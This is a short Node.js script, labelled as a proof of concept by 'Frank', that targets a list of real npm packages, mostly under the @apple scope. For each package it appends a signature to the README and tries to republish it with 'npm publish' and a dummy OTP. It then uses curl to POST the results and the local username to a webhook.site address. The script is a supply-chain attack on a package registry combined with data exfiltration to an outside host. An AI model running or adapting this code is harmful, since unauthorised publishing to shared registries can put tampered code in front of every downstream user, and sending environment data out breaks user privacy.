const { exec } = require('child_process');
const webhook = 'https://webhook.site/acc4bdb2-23c2-4ca6-8908-9a2558113cdb';

// Daftar paket yang terdeteksi memiliki akses read-write dari log sebelumnya
const targets = [
    '@apple/app-store-server-library',
    '@apple/cktool.api.base',
    '@apple/cktool.api.database',
    '@apple/cktool.core',
    '@apple/cktool.database',
    '@apple/cktool.target.browser',
    '@apple/cktool.target.nodejs',
    '@apple/hierarchical-confusion-matrix',
    '@apple/highlightjs-pkl',
    '@apple/mapkit-loader',
    '@apple/tree-sitter-pkl',
    'embedding-atlas',
    'livephotoskit'
];

const signature = 'PoC by Frank';

// Fungsi untuk mengedit satu per satu
async function runMassEdit() {
    let results = [];
    for (const pkg of targets) {
        const cmd = `echo "\n\n${signature}" >> node_modules/${pkg}/README.md && npm publish node_modules/${pkg} --otp=000000`;
        
        await new Promise((resolve) => {
            exec(cmd, (error, stdout, stderr) => {
                results.push({ package: pkg, status: error ? "FAILED/AUTH_REQUIRED" : "SUCCESS" });
                resolve();
            });
        });
    }

    const payload = JSON.stringify({
        origin: "Mass Edit Execution",
        results: results,
        env_user: process.env.USERNAME || process.env.USER || 'unknown',
        timestamp: new Date().toISOString()
    });
    
    exec(`curl -X POST -H "Content-Type: application/json" -d '${payload.replace(/'/g, "")}' ${webhook}`);
}

runMassEdit();
